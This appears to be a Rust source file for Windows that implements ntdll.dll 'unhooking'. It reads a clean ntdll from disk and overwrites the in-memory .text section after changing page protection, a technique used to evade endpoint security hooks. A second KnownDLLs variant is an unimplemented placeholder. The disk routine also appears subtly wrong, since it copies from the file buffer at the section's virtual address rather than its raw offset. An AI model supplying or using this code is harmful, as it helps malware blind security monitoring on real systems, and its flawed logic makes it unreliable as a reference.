#[cfg(target_os = "windows")]
use windows_sys::Win32::System::{
    LibraryLoader::GetModuleHandleA,
    Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE},
};

#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_disk() -> bool {
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ,
        FILE_ATTRIBUTE_NORMAL,
    };
    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, CloseHandle, GENERIC_READ};

    let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8;
    if ntdll_base.is_null() { return false; }

    let path = b"C:\\Windows\\System32\\ntdll.dll\0";
    let h = CreateFileA(
        path.as_ptr(), GENERIC_READ, FILE_SHARE_READ,
        core::ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0,
    );
    if h == INVALID_HANDLE_VALUE { return false; }

    let mut buf = vec![0u8; 0x20_0000];
    let mut bytes_read: u32 = 0;
    ReadFile(h, buf.as_mut_ptr() as _, buf.len() as u32, &mut bytes_read, core::ptr::null_mut());
    CloseHandle(h);

    let disk_ntdll = buf.as_ptr();
    let (text_rva, text_size) = get_text_section(disk_ntdll);
    if text_size == 0 { return false; }

    let target = ntdll_base.add(text_rva);
    let mut old_protect = 0u32;
    VirtualProtect(target as _, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect);
    core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
    VirtualProtect(target as _, text_size, old_protect, &mut old_protect);
    true
}

#[cfg(target_os = "windows")]
pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
    let e_lfanew   = *(base.add(0x3C) as *const u32) as usize;
    let nt         = base.add(e_lfanew);
    let num_sections = *(nt.add(0x06) as *const u16) as usize;
    let opt_size     = *(nt.add(0x14) as *const u16) as usize;
    let sections   = nt.add(0x18 + opt_size) as *const [u8; 40];
    for i in 0..num_sections {
        let sec = &*sections.add(i);
        if &sec[0..5] == b".text" {
            let virt_size = u32::from_le_bytes(sec[16..20].try_into().unwrap()) as usize;
            let virt_rva  = u32::from_le_bytes(sec[12..16].try_into().unwrap()) as usize;
            return (virt_rva, virt_size);
        }
    }
    (0, 0)
}

#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_knowndlls() -> bool {
    use windows_sys::Win32::{
        System::Memory::{MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ},
        Foundation::CloseHandle,
    };

    let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8;
    if ntdll_base.is_null() { return false; }

    // Full KnownDLLs implementation requires NtOpenSection + OBJECT_ATTRIBUTES.
    // Simplified version: map ntdll from KnownDLLs via CreateFileMapping path.
    // TODO: implement via NtOpenSection for real-world use.
    false // placeholder — will be filled in when NtOpenSection syscall is available
}
